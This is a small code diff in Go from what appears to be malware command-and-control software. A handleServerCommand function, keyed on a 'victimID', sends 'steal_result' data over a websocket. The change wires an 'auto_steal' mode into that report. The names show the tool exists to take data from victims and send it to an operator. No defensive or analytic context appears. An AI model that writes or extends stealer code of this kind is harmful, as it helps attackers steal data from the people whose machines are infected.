@@ -340,7 +340,7 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 				msg := map[string]interface{}{
 					"type":       "steal_result",
 					"data":       result,
-					"auto_steal": "",
+					"auto_steal": getAutoStealMode(),
 				}
 				if err := wsWriteJSON(conn, msg); err != nil {
 				}
